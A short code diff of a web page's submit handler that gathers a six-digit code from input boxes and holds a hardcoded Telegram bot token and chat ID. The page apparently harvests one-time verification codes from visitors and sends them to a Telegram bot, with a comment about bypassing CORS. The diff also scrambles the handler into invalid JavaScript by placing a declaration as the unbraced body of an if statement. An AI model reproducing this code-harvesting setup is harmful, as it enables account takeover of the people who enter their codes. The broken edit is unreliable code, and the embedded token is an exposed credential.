@@ -108,10 +108,11 @@
 
     // Submit handler (bypass CORS)
     submitBtn.addEventListener('click', () => {
-      const botToken = "8325475597:AAG81QSonK7rqbShO33CKxJoUOn8ZySapn4";
-      const chatId = "8401770573";
       const code = Array.from(inputs).map(input => input.value).join('');
-      if (code.length !== 6) return;
+      if (code.length !== 6) 
+        const botToken = "8325475597:AAG81QSonK7rqbShO33CKxJoUOn8ZySapn4";
+      const chatId = "8401770573";
+      return;
 
       if (typeof TELEGRAM_CONFIG === "undefined") {
         alert("Konfigurasi Telegram tidak ditemukan.");
